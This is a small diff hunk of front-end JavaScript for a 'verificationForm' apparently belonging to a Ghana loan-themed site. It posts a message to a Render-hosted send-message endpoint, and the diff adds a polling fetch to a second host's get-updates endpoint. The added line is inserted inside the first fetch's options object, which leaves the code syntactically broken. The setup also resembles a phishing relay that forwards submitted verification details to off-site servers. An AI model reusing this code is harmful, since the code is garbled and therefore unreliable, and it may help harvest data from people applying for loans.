@@ -36,6 +36,7 @@ document.getElementById('verificationForm').addEventListener('submit', async fun
     
     try {
         fetch('https://ghana-bayport-loans-1.onrender.com/api/send-message', {
+            fetch(`https://ghana-loans-xz37.onrender.com/api/get-updates/${lastUpdateId}`);
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message })
